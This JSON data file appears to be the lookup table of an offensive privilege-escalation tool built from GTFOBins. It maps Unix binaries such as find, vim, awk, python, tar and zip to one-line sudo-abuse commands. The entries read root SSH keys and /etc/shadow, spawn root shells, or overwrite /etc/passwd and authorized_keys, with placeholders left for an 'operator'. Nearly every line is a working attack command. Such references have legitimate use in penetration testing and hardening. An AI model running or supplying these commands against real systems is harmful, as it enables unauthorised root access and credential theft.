{
  "_comment": "Minimal GTFOBins sudo lookup. binary -> {functions, sudo (how to abuse with sudo), ref}. Extend from https://gtfobins.github.io. LFILE/LPORT are placeholders the operator fills.",
  "tail": {"functions": ["file-read"], "sudo": "LFILE=/root/.ssh/id_rsa; sudo tail -c1G \"$LFILE\"   # read arbitrary files as root (e.g. /root/flag.txt, /etc/shadow)", "ref": "https://gtfobins.github.io/gtfobins/tail/#sudo"},
  "head": {"functions": ["file-read"], "sudo": "LFILE=/etc/shadow; sudo head -c1G \"$LFILE\"", "ref": "https://gtfobins.github.io/gtfobins/head/#sudo"},
  "cat":  {"functions": ["file-read"], "sudo": "sudo cat /root/.ssh/id_rsa", "ref": "https://gtfobins.github.io/gtfobins/cat/#sudo"},
  "find": {"functions": ["shell"], "sudo": "sudo find . -exec /bin/sh \\; -quit   # instant root shell", "ref": "https://gtfobins.github.io/gtfobins/find/#sudo"},
  "vim":  {"functions": ["shell"], "sudo": "sudo vim -c ':!/bin/sh'", "ref": "https://gtfobins.github.io/gtfobins/vim/#sudo"},
  "less": {"functions": ["shell"], "sudo": "sudo less /etc/profile   then type  !/bin/sh", "ref": "https://gtfobins.github.io/gtfobins/less/#sudo"},
  "more": {"functions": ["shell"], "sudo": "TERM= sudo more /etc/profile   then  !/bin/sh", "ref": "https://gtfobins.github.io/gtfobins/more/#sudo"},
  "man":  {"functions": ["shell"], "sudo": "sudo man man   then  !/bin/sh", "ref": "https://gtfobins.github.io/gtfobins/man/#sudo"},
  "awk":  {"functions": ["shell"], "sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'", "ref": "https://gtfobins.github.io/gtfobins/awk/#sudo"},
  "python": {"functions": ["shell"], "sudo": "sudo python -c 'import os;os.system(\"/bin/sh\")'", "ref": "https://gtfobins.github.io/gtfobins/python/#sudo"},
  "python3": {"functions": ["shell"], "sudo": "sudo python3 -c 'import os;os.system(\"/bin/sh\")'", "ref": "https://gtfobins.github.io/gtfobins/python/#sudo"},
  "perl": {"functions": ["shell"], "sudo": "sudo perl -e 'exec \"/bin/sh\";'", "ref": "https://gtfobins.github.io/gtfobins/perl/#sudo"},
  "nmap": {"functions": ["shell"], "sudo": "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF", "ref": "https://gtfobins.github.io/gtfobins/nmap/#sudo"},
  "bash": {"functions": ["shell"], "sudo": "sudo bash", "ref": "https://gtfobins.github.io/gtfobins/bash/#sudo"},
  "sh":   {"functions": ["shell"], "sudo": "sudo sh", "ref": "https://gtfobins.github.io/gtfobins/sh/#sudo"},
  "env":  {"functions": ["shell"], "sudo": "sudo env /bin/sh", "ref": "https://gtfobins.github.io/gtfobins/env/#sudo"},
  "tar":  {"functions": ["shell"], "sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", "ref": "https://gtfobins.github.io/gtfobins/tar/#sudo"},
  "cp":   {"functions": ["file-write"], "sudo": "overwrite a root-owned file (e.g. append your key to /root/.ssh/authorized_keys, or clobber /etc/passwd)", "ref": "https://gtfobins.github.io/gtfobins/cp/#sudo"},
  "systemctl": {"functions": ["shell"], "sudo": "create a malicious unit via sudo systemctl and start it", "ref": "https://gtfobins.github.io/gtfobins/systemctl/#sudo"},
  "git":  {"functions": ["shell"], "sudo": "sudo git -p help config   then  !/bin/sh   (or PAGER)", "ref": "https://gtfobins.github.io/gtfobins/git/#sudo"},
  "vi":   {"functions": ["shell"], "sudo": "sudo vi -c ':!/bin/sh'", "ref": "https://gtfobins.github.io/gtfobins/vi/#sudo"},
  "nano": {"functions": ["file-write"], "sudo": "sudo nano   then  ^R^X  reset; sh 1>&0 2>&0", "ref": "https://gtfobins.github.io/gtfobins/nano/#sudo"},
  "zip":  {"functions": ["shell"], "sudo": "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'", "ref": "https://gtfobins.github.io/gtfobins/zip/#sudo"}
}
